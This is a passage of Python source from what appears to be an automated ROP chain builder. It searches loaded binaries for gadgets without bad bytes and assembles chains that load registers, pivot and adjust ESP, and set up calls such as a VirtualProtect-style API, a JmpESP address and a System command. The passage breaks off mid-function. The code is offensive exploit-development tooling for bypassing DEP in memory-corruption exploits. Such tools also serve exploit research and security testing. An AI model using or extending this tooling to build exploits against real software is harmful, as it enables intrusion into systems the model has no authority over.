def findDoubleTransfer(reg1, reg2,bad,length1,excludeRegs,espDesiredMovement, comment=""):
	# print (blu,"findDoubleTransfer", findDoubleTransfer, reg1, reg2,res)
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	try:
		excludeRegs.append(reg2)
		excludeRegs.append(reg1)

	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	
	for r in availableRegs:
		foundT, gT = findUniTransfer("5",r,reg2, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +reg2+" to " + r)
		if foundT:
			excludeRegs2= copy.deepcopy(excludeRegs)
			excludeRegs2.append(r)

			foundT2, gT2 = findUniTransfer("6",reg1,r, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " + r +" to " + reg1)
			if foundT2:
				pkg=pkBuild([gT,gT2])
				# showChain(pkg,True)
				return True, pkg
	return False,0
def findTripleTransfer(reg1, reg2,bad,length1,excludeRegs,espDesiredMovement, comment=""):
	# print (cya,"findTripleTransfer", reg1, reg2,res)
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	try:
		excludeRegs.append(reg2)
		excludeRegs.append(reg1)

	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	
	# print ("start availableRegs", availableRegs)
	# print ("start excludeRegs", excludeRegs)

	for r in availableRegs:
		foundT, gT = findUniTransfer("7",r,reg2, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +reg2+" to " + r)
		if foundT:

			excludeRegs2= copy.deepcopy(excludeRegs)
			excludeRegs2.append(r)
			availableRegs2= copy.deepcopy(availableRegs)
			availableRegs2.remove(r)
			# print (red, "found1 ", r, res)
			# print ("now available2 ", availableRegs2)
			# print ("now excludeRegs2  ", excludeRegs2 )

			for r2 in availableRegs2:

				foundT2, gT2 = findUniTransfer("8",r2,r, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " + r +" to " + r2)
				if foundT2:
					# print ("found2 ", r2)
					

					excludeRegs3= copy.deepcopy(excludeRegs)
					excludeRegs3.append(r2)
					# print ("now excludeRegs2  ", excludeRegs3 )

					foundT3, gT3 = findUniTransfer("9",reg1,r2, bad,length1,excludeRegs3,espDesiredMovement, "Transfer " + r2 +" to " + reg1)
					if foundT3:
						pkg=pkBuild([gT,gT2,gT3])
						# showChain(pkg,True)
						return True, pkg
	return False,0


def findTryObfMethTransfer(excludeRegs,bad,val,tThis, bb, withPR,reg,comment, isVal=False):
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	length1=True
	espDesiredMovement=0
	for r in availableRegs:
		foundT, gT = findUniTransfer("10",reg,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer to " + reg)
		if not foundT:
			continue
		success, tryPackage = tryObfMethods(excludeRegs,bad,val,tThis, bb, False,r,comment, isVal)
		if success:
			pkg=pkBuild([tryPackage,gT])
			return success, pkg
	return False, 0

def findPopTransfer(reg,val, bad,length1,excludeRegs, espDesiredMovement, comment, isVal):
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	# print ("findPopTransfer reg", reg, "val", val,"availableRegs", availableRegs,"excludeRegs", excludeRegs,res)
	for r in availableRegs:
		foundP1, p1,pDict=findPop(r,bad,length1,excludeRegs,isVal)
		print (red,"reg3",reg,res)
		foundT, gT = findUniTransfer("11",reg,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer to " + reg)
		if foundP1 and foundT:
			comment2="indirectly load " + reg
			if comment!=None:
				comment2+= ", " + comment
			chP=chainObj(p1, comment2, [val])
			pkg=[chP,gT]
			return foundP1, 0x99,pkg
	return False,0,0

def loadReg(reg,bad,length1,excludeRegs,val,comment=None, isVal=False,ID=None):
	hexVal=""
	espDesiredMovement=0
	checkAll=False
	if val!="skip":
		hexVal= hex(val)
	# print (yel,"--> the bad",binaryToStr(bad), "val",hexVal,val, "target reg",reg,res)
	if val=="skip":
		return True, 0,0
	# freeBadGoalVal=checkFreeBadBytes(opt,fg,val,bad)
	freeBadGoalVal=checkFreeBadBytes(opt,fg,val,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)
	if freeBadGoalVal:
		checkAll=True
	# if freeBadGoalVal:
	# 	print (val, "freebadbytes")
	# else:
	# 	print ("\t",hex(val),val, "has badbytes")


	if freeBadGoalVal:
		foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs,isVal)
		if foundP1:
			comment2="load " + reg
			if comment!=None:
				comment2+= ", " + comment
			chP=chainObj(p1, comment2, [val])
			return foundP1, p1, chP
	if freeBadGoalVal:
		foundPT1, p3, ptPkg= findPopTransfer(reg,val, bad,length1,excludeRegs,espDesiredMovement, comment, isVal)
		if foundPT1:
			# print ("got loadreg", reg)
			return foundPT1, p3, ptPkg


	if not freeBadGoalVal or checkAll:
		tThis=""
		# bb=""
		# print ("tryObfMethods", reg, "comment", comment)
		success, tryPackage = tryObfMethods(excludeRegs,bad,val,tThis, bb, False,reg,comment, isVal)
		if success:
			# print ("found tryObfMethods")
			tryPackage=pkBuild([tryPackage])

			# showChain(tryPackage, True)
			return success, 0x99, tryPackage
		success, tryPackage2 =findTryObfMethTransfer(excludeRegs,bad,val,tThis, bb, False,reg,comment, isVal)
		if success:
			# print ("found tryObfMethodsSpecial")
			# print (tryPackage2)
			tryPackage2=pkBuild([tryPackage2])

			# showChain(tryPackage2, True)
			return success, 0x99, tryPackage2

	if freeBadGoalVal or checkAll:
		foundX, chX=lXorAdd(reg,val,bad,length1,excludeRegs,0,isVal)
		if foundX:
			return True, 0,chX
		# if foundP1:
		# 	return foundP1, p1, chP
		
	return False, 0,0

def loadRegOld(reg,bad,length1,excludeRegs,val,comment=None):
	if val=="skip":
		return True, 0,0
	freeBadGoalVal=checkFreeBadBytes(opt,fg,val,bad)
	# if freeBadGoalVal:
	# 	# print (val, "freebadbytes")
	# else:
	# 	# print ("!!!!!!!\t",hex(val),val, "has badbytes")
	# 	pa

	foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs)

	if foundP1:
		comment2="load " + reg
		if comment!=None:
			comment2+= ", " + comment
		chP=chainObj(p1, comment2, [val])
		return foundP1, p1, chP


	foundX, chX=lXorAdd(reg,val,bad,length1,excludeRegs,0)
	if foundX:
		return True, 0,chX
	# if foundP1:
	# 	return foundP1, p1, chP
	else:
		return foundP1, p1, chP

		return False, 0,0


def getDistanceGadget(excludeRegs,rValStr,pk,reg,loc,patType=None):
	dp ("getDistanceGadget", rValStr)
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	distParam, apiReached=getDistanceParamReg(pe,n,pk,0x4000,"dec",2,loc, "esp", True,0x9ba00,0,rValStr,True,patType)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
	compensate=4
	distParam=distParam-compensate
	if patType=="lpProcName" or rValStr=="Command":
		# distParam=distParam-4 # acccount for ret in pushad
		pass
	dp ("pushad distParam", hex(distParam))
	length1=True
	espDesiredMovement=0
	package=[]
	foundStart=False
	for r in availableRegs:
		regsNotUsed= copy.deepcopy(availableRegs)
		regsNotUsed.remove(r)
		foundStart, pkStart=findMovDerefGetStack(r,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distParam)
		if foundStart:
			break
	if foundStart:
		dp ("transfer gadget")
		showChain(pkStart)
		foundT, gT = findUniTransfer("12",reg,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer to " + reg)
		if foundT:
			pk2=pkBuild([pkStart,gT])
			pk3=pkBuild([pk,pk2])
			dp ("checking on the transfer")
			distParam, apiReached=getDistanceParamReg(pe,n,pk3,distParam,"dec",2,"loc1", "esp", True,0x9ba00,0,rValStr,True,patType)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
			return True, 0, pk2,reg
	
	dp ("transfer gadget not found")
	return False, 0,0,reg

def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
	global curPat
	reg, rValStr,rExclude,r1b,com1=giveRegValsFromDict(dict,z,i)
	excludeRegs.extend(rExclude)
	excludeRegs=list(set(excludeRegs))


	found, val,com2=pv.get(rValStr, excludeRegs,reg,r1b,bad,pk)
	comment=com1+com2
	
	dp ("loadRegP__", z,i, curPat,rValStr)
	# print (red+"loadRegP__", reg, z,i, curPat,rValStr,res, val)
	 

	if rValStr=="targetDllString":
		FoundDistG, v, pk2,reg=getDistanceGadget(excludeRegs,rValStr,pk,reg,"loc1")
	elif rValStr=="JmpESP":
		val=img(val)

	elif rValStr=="hModule":
		# print ("hModule start")
		availableRegs=["ebx","ecx","edx", "esi","edi","ebp"]
		try:
			excludeRegs.remove("esp")
		except:
			pass
		for d in excludeRegs:
			try:
				availableRegs.remove(d)
			except:
				pass
		foundT, gT = findUniTransfer("13",reg,"eax", bad,length1,excludeRegs,0, "Transfer to " + reg)
		# print ("foundT", foundT, gT, "desired reg",reg)
		# foundT=False
		if foundT:
			pkTransfer=pkBuild([gT])
		else:
			foundDT, gDT=findDoubleTransfer(reg, "eax", bad,length1,excludeRegs,0, "")
			# foundDT=False
			if foundDT:
				pkTransfer=pkBuild([gDT])
				
			else:
				foundTT, gTT=findTripleTransfer(reg, "eax", bad,length1,excludeRegs,0, "")
				if foundTT:
					pkTransfer=pkBuild([gTT])
				else:
					print (" Lacking gadget to transfer hModule")
					return False, 0,0,0

					pass

		if rValStr=="hModule":
			comment="  get hModule"
		elif rValStr=="SystemPTR":
			comment = " get System ptr"
			gT[-1].modCom(comment)
	elif rValStr=="SystemPTR":
		availableRegs=["ebx","ecx","edx", "esi","edi","ebp"]

		
		foundStart, gT=findMovDerefGetStackNotReg(reg,bad,length1, excludeRegs,availableRegs,0,0xFFFFFE68)  ## - 0x198 - we will put a dereference there for it.
		# foundM1, gT = findMovDeref2(reg,"eax",bad,length1, availableRegs,0)
		
		if foundStart:
			pkTransfer=pkBuild([gT])
		else:
			print ("       Failed: Need a mov dereference / get stack ptr gadget.")
			return False, 0,0,0

	elif rValStr=="flOldProtect":
		return found, 0, val,reg
		
	elif rValStr=="lpProcName":
		rValStr2="targetDllString"

		# dp ("lpProcName contents", pk)
		# global outFile
		# outFile.write("About to do Loc2  " )
		comment=" - get lpProcName"
		FoundDistG, v, pk2,reg=getDistanceGadget(excludeRegs,rValStr2,pk,reg,"loc2","lpProcName")

	elif rValStr=="Command":
		rValStr2="System"
		# dp ("lpProcName contents", pk)
		# global outFile
		# outFile.write("About to do Loc2  " )
		FoundDistG, v, pk2,reg=getDistanceGadget(excludeRegs,rValStr2,pk,reg,"loc3","System")
		comment=" - get Command"
	elif rValStr=="VPPtr2" or rValStr=="VAPtr2":
		comment+=" - dereferencing the API"
		bFind, pk=findMovDerefLeftJustOneLoad(reg,val,bad,length1, excludeRegs,comment,0)
		if bFind:
			return bFind, 0, pk,reg
		else:
			return False, 0,0,reg

	try:
		if hasImg[rValStr]:
			tryThis= "with " + hex(img(val)) + " -> " + disOffset(val)
		else:
			tryThis=" # "
	except:
		tryThis=""

	# comment2="load " + reg
	comment2 = " " +  tryThis
	
	if comment!=None:
		comment2+= comment
	
	try:
		if hasImg[rValStr]:
			val=img(val)
	except:
		pass

	# foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs)
	# chP=chainObj(p1, comment2, [val])
	if rValStr=="skip":
		return True, None, None,reg


	if (rValStr=="targetDllString" or rValStr=="lpProcName" or rValStr=="Command") and FoundDistG:
		return True, 0, pk2,reg
	if rValStr=="hModule" or rValStr=="SystemPTR":
		return True, 0, pkTransfer,reg		

	foundP1, p1, chP = loadReg(reg,bad,length1,excludeRegs,val,comment2,False,"test")
	if foundP1:
		return foundP1, p1, chP,reg
	else:
		return False, 0,0,reg

def loadRegEmu(reg,bad,length1,excludeRegs,val,comment=None):
	foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs)
	comment2="load " + reg
	if comment!=None:
		comment2+= ", " + comment
	chP=chainObj(p1, comment2, [val])
	val, apiReached=getDistanceParamReg(pe,n,[chP],distEsp,IncDec,numP,"winApi", "esp", destAfter,PWinApi)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
	# dp ("val22",val)
	if foundP1:
		return foundP1, p1, chP
	else:
		return False, 0,0

def findChangeESP(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distFinalESP, curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi=0):
	# print ("sysTarget", sysTarget, PWinApi,targetP)
	global stopDistanceEmu
	global xy
	xy=0

	stopDistanceEmu=False
	dp ("findChangeESP", reg, targetP, "numpP", numP)
	foundAdd, package,packageb, packagec,dEsp,bYes,oldDESP = findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi, False,0)
	if foundAdd:
		dp ("end packages")
		showChain(package)
		showChain(packageb)
		showChain(packagec)
	if foundAdd:
		dp ("package findChangeESP")
		showChain(package)
		if compensate==0:
			dp ("compensate 0")
			return foundAdd, package
		elif compensate==4:
			dp ("compensate 4")
			return foundAdd, packageb
		elif compensate==-4:
			dp ("compensate -4")
			return foundAdd, packagec

	return False,0

prevDistFinalESP=0
xy=0
addEspAttempts=set()
startPk=0
pkMonitor=False
finalPivotGadget=0xFFFFFFFF
AddToESP=True
def giveBoolAddToESP():
	global AddToESP
	if AddToESP:
		AddToESP=False
	else:
		AddToESP=True
	return AddToESP



def clearGlobals():
	global stopDistanceEmu
	global prevDistFinalESP
	global xy
	global startPk
	global pkMonitor
	global finalPivotGadget

	xy=0
	stopDistanceEmu=False
	finalPivotGadget=0xFFFFFFFF
	startPk=0
	pkMonitor=False
	prevDistFinalESP=0


def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi=0,recurs=False, iD=0):
	# print ("distFinalESP", distFinalESP, hex(distFinalESP))
	# print (targetP,sysTarget,PWinApi,iD)
	global stopDistanceEmu
	global prevDistFinalESP
	global xy
	global startPk
	global pkMonitor
	global finalPivotGadget

	dp ("findAddEsp distEsp", hex(distEsp))
	dp (">>>>>>>>>findAddEsp", recurs, "id", iD)
	foundAdd=False
	if recurs:
		prevDistFinalESP=distFinalESP
	upperLimit=15
	# distFinalESP=getDistanceParamReg(pe,n,curPk,distEsp,IncDec,numP,targetP, "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter   "winApi"
	# oldDESP=distFinalESP
	# if not recurs:
	# 	prevDistFinalESP=distFinalESP#-8
	# if recurs:
	# 	dp("distFinalESP 2", hex(distFinalESP))
	# 	dp ("new val", hex(distFinalESP+prevDistFinalESP))
	# 	dp (hex(truncate(distFinalESP+prevDistFinalESP,32)+compensate),"prevDistFinalESP")
	# 	distFinalESP=truncate(distFinalESP+prevDistFinalESP,32)+compensate
	# 	dp ("new distFinalESP", hex(distFinalESP))
	dp ("curPk view (prev)")
	showChain(curPk)
	t=0
	bYes=False
	if not pkMonitor:
		startPk=curPk
		dp ("start curPk", len(curPk))
	pkMonitor=True
	AddToESP=True
	for op2 in regsNotUsed:
		foundAdd=False
		continueFlag=False
		if bYes:
			break
		dp ("\n-------------------->>   op2", op2,t, "distfinalesp", hex(distFinalESP), "recurs", recurs, "bYes", bYes, "id", iD)
		# foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs,distFinalESP)
		foundL1, p2, chP2 = loadReg(op2,bad,length1,excludeRegs,distFinalESP)
		# if foundL1:
		# 	print (red,"built loadReg", hex(distFinalESP),res)
		foundL1b, p2b, chP2b = loadReg(op2,bad,length1,excludeRegs,(distFinalESP+4))
		foundL1c, p2c, chP2c = loadReg(op2,bad,length1,excludeRegs,(distFinalESP-4))


		# distFinalESPStart=getDistanceParamReg(pe,n,[chP],distEsp,IncDec,numP,"winApi", "esp", destAfter)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
		if not foundL1 or not foundL1b or not foundL1c:
			continue
		foundAdd, a1 = findGenericOp2("add", op2,"esp",bad,length1, excludeRegs,espDesiredMovement)
		if not foundAdd:
			continue
		if foundL1 and foundAdd:
			# print (foundAdd, a1)
			finalPivotGadget=a1
			# print (red,"finalPivotGadget", gre,a1, hex(a1),res)
			# print (disOffset(a1))

			cA=chainObj(a1, "Move esp to reach API", [])
			# cP2=chainObj(p2, "Change value for esp", [distFinalESP])
			# test2=[cP2,cA]
			test2=pkBuild([chP2,cA])
			# print (chP2b, cA)
			test2b=pkBuild([chP2b,cA])
			test2c=pkBuild([chP2c,cA])

			showChain(test2)
			if not recurs:
				curPk=pkBuild([startPk,test2]) #pkFn,pkD
				dp ("curPk view-->new")
				# showChain(curPk)
				distFinalESP,apiReached=getDistanceParamReg(pe,n,curPk,distEsp,IncDec,numP,targetP, "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter   "winApi"
				
				oldDESP=distFinalESP
				recurs=True
				# print ("distFinalESP1", distFinalESP, hex(distFinalESP))	
								
				showChain(curPk)
				dp ("*******************starting the recursive findAddEsp recurs",recurs, "id", iD)
				dp("distFinalESP", hex(distFinalESP))
				distFinalESP=distFinalESP-4
				# print ("did subtract by 4, ", hex(distFinalESP))
				dp("distFinalESP-4", hex(distFinalESP))
				foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP = findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi, True,1)
				if stopDistanceEmu:
					dp ("stop loc1")
					showChain(test2)
					return foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP
				dp ("oh ok", hex(dEsp), "id", iD)
				dp("distFinalESP", hex(distFinalESP), "prevDistFinalESP", hex(prevDistFinalESP), "foundAdd", foundAdd)
			elif recurs:
				# curPk=curPk[:-2]  #hardcoded for 2  to remove - may need to be updated as gets more advanced
				
				# distFinalESP=0x19c
				# cP2=chainObj(p2, "Change value for esp", [distFinalESP])
				# test2=[cP2,cA]
				# test2=pkBuild([chP2,cA])
				# test2b=pkBuild([chP2b,cA])
				# test2c=pkBuild([chP2c,cA])

				curPk=startPk+test2
				dp ("in recurse curPk")
				showChain(curPk)

				# newSize=len(test2)
				# oldPk=curPk
				# dp ("oldPk", len(oldPk), "xy", xy)
				# curPk=pkBuild([curPk,test2]) #pkFn,pkD
				# dp ("oldPk", len(oldPk), "newpk", len(curPk)+newSize)
				# if len(oldPk)!=len(curPk) + newSize and xy > 2:
				# 	curPk=curPk[:-newSize]  #hardcoded for 2  to remove - may need to be updated as gets more advanced
				oldDESP2=distFinalESP

				distFinalESP,apiReached=getDistanceParamReg(pe,n,curPk,distEsp,IncDec,numP,targetP, "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter   "winApi"
				oldDESP=distFinalESP
				# print ("distFinalESP", hex(distFinalESP))
				dp ("right after functions ends")
				if apiReached:
					stopDistanceEmu=True
					# print ("return true0a")

					return True, test2,test2b,test2c,distFinalESP,bYes,oldDESP
				if not recurs:
					prevDistFinalESP=distFinalESP#-8
				if recurs:
					dp("distFin/alESP 2", hex(distFinalESP), "oldDESP2", hex(oldDESP2))
					dp ("new val", hex(distFinalESP+oldDESP2))
					dp (hex(truncate(distFinalESP+oldDESP2,32)+compensate),"prevDistFinalESP")
					# print ("previous before truncate", hex(distFinalESP),cya,"oldDESP2", hex(oldDESP2), gre,"distFinalESP+oldDESP2", hex(distFinalESP+oldDESP2),yel, "compensate", hex(compensate),res)
					distFinalESP=truncate(distFinalESP+oldDESP2,32)+compensate
					# print ("after truncate new distFinalESP", hex(distFinalESP))
				# dp ("curPk view (prev)")
				# showChain(curPk)
				dp ("***************in the recurs id", iD, "xy", xy)
				# dp ("curPk view-->new recurse")
				# print("distFinalESP", hex(distFinalESP), hex(oldDESP),hex(oldDESP2), xy)
				if xy < upperLimit and oldDESP !=0 and distFinalESP !=0:

					### this used to help, but with new changes, it probably is not going to make a difference. if the distFinalESP is not found through the other method - which searches through memory to find it - then this likely will be of no help. Still, it is kept, just in case.
					xy+=1
					if targetP=="sysInvoke":
						AddToESP = giveBoolAddToESP()
						while distFinalESP in addEspAttempts:
							if AddToESP:
								# print ("oh, we already tried ", hex(distFinalESP), "so let's add 4")
								distFinalESP=distFinalESP+4
							else:
								# print ("oh, we already tried ", hex(distFinalESP), "so let's subtract 4")
								distFinalESP=distFinalESP-4
							if distFinalESP==0:
								break
						# print ("final distFinalESP3", hex(distFinalESP))
					addEspAttempts.add(distFinalESP)
					foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP = findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP, sysTarget,PWinApi,True,2)
					dp ("oh ok2", hex(dEsp), hex(oldDESP), "id", iD)
					# print("distFinalESP4", hex(distFinalESP), "prevDistFinalESP", hex(prevDistFinalESP),"id", iD)
					if not foundAdd:
						continue
					if stopDistanceEmu:
						dp ("stop loc2")
						# showChain(test2)
						# print ("return true0")
						return foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP
					if (foundAdd and oldDESP)==0 or (foundAdd and dEsp==0):
						dp ("returning foundAdd", foundAdd, "id", iD)
						bYes=True
						dp ("do test2 testb")
						# print (test2, test2b, test2c)
						# showChain(test2,True)
						showChain(test2b)
						showChain(test2c)
						# print ("return true1")
						return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
					else:
						dp ("not foundAdd", foundAdd, "id", iD)
						continue
				elif xy >upperLimit or( oldDESP==0):
					dp ("ending func, foundAdd", foundAdd, "xy",xy, "oldDESP", oldDESP, "id", iD)
					xy=0
					bYes=True
					dp ("do test2 testb 2")
					showChain(test2)
					showChain(test2b)
					showChain(test2c)
					# print ("apiReached", apiReached, "oldDESP",oldDESP)
					# print ("return true2")
					return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
			else:
				dp ("***************ending else")
				xy=0
				dp ("do test2 testb 3")
				# showChain(test2,True)
				showChain(test2b)
				showChain(test2c)
				return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
		t+=1
	if foundAdd:
		dp ("do test2 testb 4")
		showChain(test2)
		showChain(test2b)
		showChain(test2c)
			
		if stopDistanceEmu:
			return True, test2, test2b,test2c, distFinalESP,bYes,oldDESP
	return False, None,0, False,-0x6969696,-0x6969696,-0x6969696,
def findXchgMovRegSpecial(reg1, bad,length1,excludeRegs,espDesiredMovement):
	#reg 1 - the one we want
	#reg2 = secondary - will transfer

	dp ("xchg", reg1)
	instruction="xchg"
	bExists, myDict=fg.getFg(instruction,reg1)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and ((myDict[p].op2==reg1 and not myDict[p].op1==reg1 ) or (myDict[p].op1==reg1 and myDict[p].op2==reg1 )):
					dp ("found ",instruction, reg1, "ops", myDict[p].op1, myDict[p].op2)
					if reg1 not in myDict[p].op1:
						return True,p, myDict[p].op1
					else:
						return True,p, myDict[p].op2

			dp ("findXchg returning False" )
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				freeBad=False
				if myDict[p].opcode=="c3" and freeBad and ((myDict[p].op2==reg1 and not myDict[p].op1==reg1 ) or (myDict[p].op1==reg1 and myDict[p].op2==reg1 )):
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg1), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg1)
					
					if reg1 not in myDict[p].op1:
						return True,m, myDict[p].op1
					else:
						return True,m, myDict[p].op2
				else:
					return False,0,0
	else:
		# dp ("return false ", instruction)
		return False,0,0
def getPushPopESP(reg,excludeRegs,espDesiredMovement,regMatch, c3Only, comment=True):
	# print(gre,"getPushPopESP",reg,res)
	global rC
	instruction="push"
	excludeRegsSet=set(excludeRegs)
	bExists, myDict=fg.getFg(instruction,"esp")
	stackPivotAmount=0
	newReg=None
	if bExists:
		for p in myDict:
			checkRopTester()
			continueFlag=False
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			out =disOffset(p)
			out+=""
			# if not myDict[p].opcode=="c3" and c3Only:
			# 	continue
			if myDict[p].opcode=="c3":
				continue
			if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I) or not freeBad:
				continue
			if "pop" in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "div" in out and not "leave" in out and "mov esp" not in out and "fdiv" not in out and "push esp" in out:
				pushInstances = re.findall('push', out)
				if len((pushInstances))>1:
					# print ("continueFlag1")
					continue
				popInstances = re.findall('pop [\w]+', out)
				t=0
				for pReg in popInstances:
					test=pReg.split("pop ")
					if t>0:
						if test[1] in excludeRegsSet:
							# print (cya+"got a bad one", excludeRegsSet, res)
							continueFlag=True
					t+=1
				if continueFlag:
					# print (cya,out,res)
					# print ("bad reg", excludeRegsSet, "need", reg)
					# print ("continueFlag2")
					continue
				transferReg=popInstances[0].split("pop ")
				newReg=transferReg[1]

				if newReg in excludeRegs:
					continue
				if regMatch:
					if newReg!=reg:
						continueFlag=True
				if continueFlag:
					# print (cya,out,res)
					# print ("     want ", red,reg,res)					
					# print ("continueFlag4", reg, newReg)
					continue
				checkForClobber=out.split("pop "+transferReg[1])
				# print ("checkForClobber", checkForClobber, "transferReg", transferReg[1])
				if transferReg[1] in checkForClobber[1]:
					# print ("it gets clobbered!", checkForClobber[1])
					# print ("continueFlag3")
					continue
				rC+=1
				outEmObj=rop_tester(myDict[p].raw, hex(p)+"  2")
				# outEmObj.show()
				
				checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs)#,[newReg])
				if not checkedFree:
					continue
				
				# print (mag,"checkfreed esp", disOffset(p),res)

				if 2==3:
					pass
					# c2Amt=0
					# c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
					# if c2Search:
					# 	# print ("c2Search:", c2Search)
					# 	c2Ret=c2Search[0].split("ret ")
					# 	# print ("c2Ret:", c2Ret)
					# 	try:
					# 		c2Amt=int(c2Ret[1],16)
					# 	except:
					# 		c2Amt=int(c2Ret[1])
				c2Amt=calcC2Amount(p)
				if c2Amt!=0:
					modulo=c2Amt % 4
					if modulo!=0:
						continueFlag=True
				if continueFlag:
					continue
				# print (red+"\n--> possible",res)
				# print ("transferReg",transferReg[1], "stackPivotAmount", stackPivotAmount, hex(stackPivotAmount))
			
				# print (cya, hex(p), res, out, yel,"newReg", newReg,mag, reg, stackPivotAmount)
				return True, p, newReg, stackPivotAmount,myDict[p].opcode,c2Amt
	return False, 0,0,0,0,0

rC=0
def checkRopTester():
	global rC
	if rC==25:
		doGC()
		rC=0
		
	# Emulation run a certain number of times in succession can cause it to crash. We have to manually do garbage collection to overcome this issue.
	
def getPushPopReg(reg, reg2,excludeRegs,espDesiredMovement,regMatch=True, c3Only=True,notESP=True ):
	# print ("getPushPopReg")
	global rC
	try:
		# do excluded regs
		# print ("getPushPopReg",reg,reg2)
		instruction="push"
		# excludeRegs=["ebx"]
		excludeRegsSet=set(excludeRegs)
		bExists, myDict=fg.getFg(instruction,reg)
		stackPivotAmount=0
		newReg=None
		transferReg=None
		if bExists:
			for p in myDict:
				checkRopTester()
				newTransferReg=None
				continueFlag=False
				if not myDict[p].opcode=="c3" and c3Only:
					continue
				# if myDict[p].opcode=="c3":
				# 	continue
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				out =disOffset(p)
				out+=""
				# print ("---", out)
				# out="push esp # mov eax, edi # pop edi # add edi, 0x4 # pop esi # ret"
				if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I) or not freeBad:
					continue
				if "pop " in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "leave" in out and "mov esp" not in out and "xchg esp" not in out and "fdiv" not in out:
					pushInstances = re.findall('push', out)
					if len((pushInstances))>1:
						# print ("continueFlag1")
						continue
					popInstances = re.findall('pop [\w]+', out)
					t=0
					for pReg in popInstances:
						test=pReg.split("pop ")
						if t==0:
							newTransferReg=test[1]
							# print ("   newTransferReg:", newTransferReg)
							if regMatch:
								if newTransferReg!=reg2:
									continueFlag=True
						if t>0:
							if test[1] in excludeRegsSet:
								continueFlag=True
						t+=1
					if notESP and newTransferReg=="esp":
						continue
					if continueFlag:
						continue
					rC+=1
					outEmObj=rop_tester(myDict[p].raw, hex(p)+"  2")
					checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs)#,[newTransferReg])
					c2Amt=0
					if checkedFree and not continueFlag:
						# print (yel,"checkfreed", disOffset(p),res)
